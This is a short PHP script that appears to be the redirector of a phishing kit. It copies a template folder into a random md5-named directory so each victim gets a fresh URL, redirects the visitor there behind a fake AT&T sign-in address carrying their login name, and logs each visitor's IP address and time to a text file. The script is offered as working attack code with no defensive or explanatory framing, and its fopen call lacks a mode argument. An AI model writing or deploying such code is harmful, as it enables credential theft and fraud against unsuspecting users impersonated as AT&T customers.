<?php

session_start();
$_SESSION['referer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

$login = $_GET['login'];
$DIR=md5(rand(0,1000000));
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="new3";
recurse_copy( $home, $DIR );
header("location:$DIR?https://signin.att.com/login=$login&?auth=2&home=1&from=L3d3dy5hc@");
$ip = getenv("REMOTE_ADDR");
$file = fopen("ip.txt");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>